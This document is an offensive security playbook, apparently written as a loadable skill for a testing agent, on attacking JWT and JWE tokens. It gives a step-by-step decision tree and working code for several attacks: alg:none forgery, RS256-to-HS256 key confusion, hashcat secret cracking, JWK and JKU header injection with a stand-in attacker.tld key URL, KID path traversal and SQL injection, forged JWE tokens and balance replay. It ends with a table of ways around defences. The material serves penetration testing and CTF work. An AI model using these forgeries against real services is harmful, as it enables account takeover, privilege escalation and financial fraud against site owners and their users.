# JWT / JWE Token Attacks

## Trigger

Load when you see:

- `Authorization: Bearer eyJ...` (three base64url segments separated by dots)
- Tokens with five base64url segments (JWE compact format: header.enckey.iv.ciphertext.tag)
- `kid`, `jku`, `x5u` headers in decoded JWT
- `alg` field in JWT header (especially RS256, HS256, ES256)
- JWKS endpoints: `/.well-known/jwks.json`, `/api/keys`, `/api/getPublicKey`
- OIDC discovery: `/.well-known/openid-configuration`

## Attack Surface

- Application trusts the JWT without verifying the signature (uses `decode()` instead of `verify()`)
- Public key is exposed via JWKS endpoint, SSL certificate, or API response
- HMAC-signed tokens (HS256) with weak secrets
- Custom header fields like `kid`, `jku`, `jwk`, `x5u` in the token header
- Token replay across transactions (balance/role/state changes not persisted server-side)

## Decision Tree

1. Decode the token: `cut -d. -f2 | base64 -d` to inspect payload
2. Try `alg: none` -- remove signature, set `"alg":"none"` in header
3. Try RS256-to-HS256 algorithm confusion -- use the exposed public key as HMAC secret
4. Try weak secret cracking -- hashcat mode 16500 with rockyou
5. Try JWK/JKU header injection -- embed attacker's public key or point to attacker's JWKS
6. Try KID injection -- path traversal (`../../../dev/null`) or SQL injection
7. For JWE (5-segment tokens): check if public key is exposed and usable for re-encryption

## Techniques

### Algorithm None

```python
import base64, json
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","exp":9999999999}).encode()).rstrip(b"=").decode()
forged = f"{header}.{payload}."
# Variants: None, NONE, nOnE, noNe
```

### RS256 to HS256 Algorithm Confusion

If the server accepts both RS256 and HS256, use the exposed public key as an HMAC secret:

```python
import jwt
# Fetch the public key from JWKS or SSL
public_key = open("pubkey.pem").read()
forged = jwt.encode({"sub":"admin"}, public_key, algorithm="HS256")
```

### Weak Secret Brute-Force

```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# jwt.txt contains the full JWT string
```

### Unverified Signature (Crypto-Cat)

Some JWT libraries have separate `decode()` (no verification) and `verify()`. If the server calls only `decode()`, the signature is never checked:

```python
import base64, json
parts = token.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
payload['sub'] = 'administrator'
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
forged = f"{parts[0]}.{new_payload}.{parts[2]}"
```

### JWK Header Injection

Server accepts JWK embedded in the token header without validating it's from a trusted source:

```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
import jwt, base64

private_key = rsa.generate_private_key(65537, 2048, default_backend())
public_numbers = private_key.public_key().public_numbers()
jwk = {
    "kty": "RSA",
    "kid": "attacker-key",
    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes(3, 'big')).rstrip(b'=').decode(),
    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes(256, 'big')).rstrip(b'=').decode()
}
forged = jwt.encode({"sub": "admin"}, private_key, algorithm='RS256', headers={'jwk': jwk})
```

### JKU Header Injection

Server fetches the public key from a URL specified in the JKU header:

```python
import jwt
# Host a JWKS file at http://attacker.tld/jwks.json containing attacker's public key
forged = jwt.encode({"sub": "admin"}, attacker_private_key, algorithm='RS256',
                     headers={'jku': 'http://attacker.tld/jwks.json'})
```

### KID Path Traversal

KID is used to construct a file path for key lookup:

```python
import jwt
# /dev/null returns empty bytes -> HMAC key is empty string
forged = jwt.encode({"sub": "admin"}, '', algorithm='HS256',
                     headers={"kid": "../../../dev/null"})
# SQL injection variant: kid = "key1' UNION SELECT 'known-secret' --"
```

### JWE Token Forgery (Public Key Exposed)

JWE tokens are encrypted, not signed. If the RSA public key is exposed, forge encrypted tokens:

```python
from jwcrypto import jwk, jwe
import json

public_key_pem = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqh...\n-----END PUBLIC KEY-----"
key = jwk.JWK.from_pem(public_key_pem.encode())
token = jwe.JWE(
    json.dumps({"sub": "attacker", "balance": 999999}).encode(),
    recipient=key,
    protected=json.dumps({"alg": "RSA-OAEP-256", "enc": "A256GCM"})
)
forged_jwe = token.serialize(compact=True)
```

### JWT Balance Replay

1. Capture JWT with balance=$100
2. Spend -- balance drops to $0
3. Replay the old JWT (balance back to $100)
4. Return items -- server adds prices to the $100 balance from the token
5. Repeat until balance exceeds target price

## Bypass

| Block | Bypass |
|-------|--------|
| `alg: none` rejected | Try `None`, `NONE`, `nOnE`, `noNe` |
| RS256-only enforcement | Check if HS256 is also accepted with public key as secret |
| Kid validation | Path traversal: `../../../dev/null`, `../../../proc/sys/kernel/hostname` |
| JKU domain whitelist | Open redirect chain, subdomain takeover, `@` URL parsing confusion |
| JWK rejected | Check if `jku` or `x5u` are accepted instead |

## Verification

- Send forged token to a protected endpoint; 200 + admin content = success
- Token accepted with `alg: none` = critical (9.8 CVSS)
- JWK/JKU injection accepted = critical (complete trust bypass)

## Pitfalls

- `alg: none` sometimes requires the trailing dot: `header.payload.` (NOT `header.payload`)
- JWK `n` (modulus) and `e` (exponent) must be base64url-encoded without padding
- JWT libraries may silently ignore `alg: none` in newer versions -- check the library version
- If server uses `jsonwebtoken.verify()`, `alg: none` will throw -- but some wrappers catch and return decoded anyway
- Balance replay assumes server does NOT cross-check the JWT balance against a server-side ledger
- For JWE: check the difference between 3-part (signed JWT) and 5-part (encrypted JWE) tokens
